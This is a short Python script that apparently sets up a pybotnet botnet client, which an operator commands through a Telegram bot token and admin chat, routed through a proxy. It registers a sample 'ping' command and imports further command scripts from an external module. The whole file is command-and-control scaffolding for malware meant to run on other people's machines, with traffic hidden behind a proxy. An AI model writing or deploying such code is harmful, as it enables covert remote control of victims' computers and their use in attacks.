import logging

from pybotnet import BotNet, Request, UserException, TelegramEngine
from simple_external import external_botnet

from configs import ADMIN_CHAT_ID, TELEGRAM_TOKEN

_logger = logging.getLogger(f"__{__name__}   ")

# create engine: Engines transfer messages between admin and botnet
telegram_engine = TelegramEngine(
    token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID, use_proxy=True
)


botnet = BotNet(telegram_engine, debug=False)

# create new script
@botnet.add_script(script_version="0.1.0")
def ping(request: Request, *args):
    """`ping`"""
    return f"pong {' '.join(args)}"


# add external scripts
botnet.import_scripts(external_botnet)


if __name__ == "__main__":
    _logger.debug(botnet)
    botnet.run()
